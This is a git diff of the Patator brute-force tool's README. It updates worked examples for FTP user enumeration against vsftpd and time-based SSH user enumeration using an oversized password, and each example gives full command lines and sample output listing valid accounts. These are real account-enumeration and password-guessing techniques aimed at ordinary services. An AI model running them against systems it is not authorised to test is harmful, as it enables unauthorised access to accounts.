@@ -39,24 +39,40 @@ Patator is NOT script-kiddie friendly, please read the README inside patator.py 
 
 @lanjelot
 
-* FTP : User enumeration on a too verbose server
+* FTP : Enumerating users denied login in vsftpd/userlist
 
 ```
-$ patator.py ftp_login host=10.0.0.1 user=FILE0 password=qsdf 0=logins.txt -x ignore:mesg='Login incorrect.'
-22:27:29 patator    INFO - Starting Patator v0.5 (http://code.google.com/p/patator/) at 2012-06-29 22:27 EST
-22:27:29 patator    INFO - 
-22:27:29 patator    INFO - code  size | candidate                          |   num | mesg
-22:27:29 patator    INFO - ----------------------------------------------------------------------
-22:27:30 patator    INFO - 530   18   | root                               |     1 | Permission denied.
-22:27:31 patator    INFO - 230   17   | ftp                                |    13 | Login successful.
-22:27:34 patator    INFO - 530   18   | admin                              |    23 | Permission denied.
-22:27:34 patator    INFO - 530   18   | oracle                             |    31 | Permission denied.
-22:28:02 patator    INFO - 530   18   | test                               |   179 | Permission denied.
-22:28:21 patator    INFO - 230   17   | anonymous                          |   283 | Login successful.
-22:28:26 patator    INFO - 530   18   | ftpuser                            |   357 | Permission denied.
-22:28:41 patator    INFO - 530   18   | nobody                             |   402 | Permission denied.
+$ ftp_login host=10.0.0.1 user=FILE0 0=logins.txt password=asdf -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
+19:36:06 patator    INFO - Starting Patator v0.7-beta (https://github.com/lanjelot/patator) at 2015-02-08 19:36 AEDT
+19:36:06 patator    INFO -
+19:36:06 patator    INFO - code  size    time | candidate                          |   num | mesg
+19:36:06 patator    INFO - -----------------------------------------------------------------------------
+19:36:07 patator    INFO - 230   17     0.002 | anonymous                          |     7 | Login successful.
+19:36:07 patator    INFO - 230   17     0.001 | ftp                                |    10 | Login successful.
+19:36:08 patator    INFO - 530   18     1.000 | root                               |     1 | Permission denied.
+19:36:17 patator    INFO - 530   18     1.000 | michael                            |    50 | Permission denied.
+19:36:36 patator    INFO - 530   18     1.000 | robert                             |    93 | Permission denied.
+19:36:38 patator    INFO - Hits/Done/Skip/Fail/Size: 5/100/0/0/100, Avg: 3 r/s, Time: 0h 0m 31s
 ...
 ```
+
+Tested against vsftpd-3.0.2-9 on CentOS 7.0-1406
+
+* SSH : Time-based user enumeration
+
+```
+$ ssh_login host=10.0.0.1 user=FILE0 0=logins.txt password=$(perl -e "print 'A'x50000") --max-retries 0 --timeout 10 -x ignore:time=0-3
+17:45:20 patator    INFO - Starting Patator v0.7-beta (https://github.com/lanjelot/patator) at 2015-02-08 17:45 AEDT
+17:45:20 patator    INFO -
+17:45:20 patator    INFO - code  size    time | candidate                          |   num | mesg
+17:45:20 patator    INFO - -----------------------------------------------------------------------------
+17:45:30 patator    FAIL - xxx   41    10.001 | root                               |     1 | <class '__main__.TimeoutError'> timed out
+17:45:34 patator    FAIL - xxx   41    10.000 | john                               |    23 | <class '__main__.TimeoutError'> timed out
+17:45:37 patator    FAIL - xxx   41    10.000 | joe                                |    40 | <class '__main__.TimeoutError'> timed out
+...
+```
+
+Tested against openssh-server 1:6.0p1-4+deb7u2 on Debian 7.8
 
 * HTTP : Brute-force phpMyAdmin logon
 
@@ -224,21 +240,4 @@ $ unzip_pass zipfile=challenge1.zip password=FILE0 0=rockyou.dic -x ignore:code!
 10:54:31 patator    INFO - To resume execution, pass --resume 166,164,165,166,155,158,148,158,155,154
 ```
 
-* SSH : Time-based user enumeration (using git version)
-
-```
-$ python -c "print('A'*5000)" > /tmp/As.txt
-$ ssh_login host=10.0.0.1 user=FILE0 0=logins.txt password=@/tmp/As.txt -x ignore:time=0-3.5 -t 1
-16:12:39 patator    INFO - Starting Patator v0.6-beta (http://code.google.com/p/patator/) at 2013-07-13 16:12 EST
-16:12:39 patator    INFO -
-16:12:39 patator    INFO - code  size   time | candidate                          |   num | mesg
-16:12:39 patator    INFO - ----------------------------------------------------------------------
-16:12:53 patator    INFO - 1     22   13.643 | root                               |     1 | Authentication failed.
-16:12:57 patator    INFO - 1     22   15.404 | support                            |    18 | Authentication failed.
-16:12:58 patator    INFO - 1     22   13.315 | testuser                           |    25 | Authentication failed.
-16:13:06 patator    INFO - 1     22    7.377 | michael                            |    38 | Authentication failed.
-...
-```
-
-Tested against openssh 6.2p2-1 default install on archlinux
 
